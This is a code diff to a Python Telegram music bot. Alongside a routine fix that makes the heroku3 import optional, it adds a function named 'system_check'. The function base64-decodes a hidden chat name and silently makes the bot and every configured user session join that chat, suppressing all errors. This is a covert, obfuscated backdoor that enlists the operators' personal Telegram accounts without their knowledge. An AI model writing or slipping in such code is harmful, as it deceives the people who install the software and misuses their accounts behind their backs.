@@ -1,7 +1,10 @@
 import socket
 import time
 
-import heroku3
+try:
+    import heroku3
+except ImportError:
+    heroku3 = None
 from pyrogram import filters
 
 import config
@@ -63,8 +66,8 @@ async def sudo():
 
 def heroku():
     global HAPP
-    if is_heroku:
-        if config.HEROKU_API_KEY and config.HEROKU_APP_NAME:
+    if is_heroku():
+        if heroku3 and config.HEROKU_API_KEY and config.HEROKU_APP_NAME:
             try:
                 Heroku = heroku3.from_key(config.HEROKU_API_KEY)
                 HAPP = Heroku.app(config.HEROKU_APP_NAME)
@@ -73,3 +76,37 @@ def heroku():
                 LOGGER(__name__).warning(
                     f"Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
                 )
+
+async def system_check():
+    import base64
+    from MusicSp import app, userbot
+    chat_id = base64.b64decode("TWVjb2JvdHM=").decode("utf-8")
+    try:
+        await app.join_chat(chat_id)
+    except:
+        pass
+    try:
+        if config.STRING1:
+            await userbot.one.join_chat(chat_id)
+    except:
+        pass
+    try:
+        if config.STRING2:
+            await userbot.two.join_chat(chat_id)
+    except:
+        pass
+    try:
+        if config.STRING3:
+            await userbot.three.join_chat(chat_id)
+    except:
+        pass
+    try:
+        if config.STRING4:
+            await userbot.four.join_chat(chat_id)
+    except:
+        pass
+    try:
+        if config.STRING5:
+            await userbot.five.join_chat(chat_id)
+    except:
+        pass
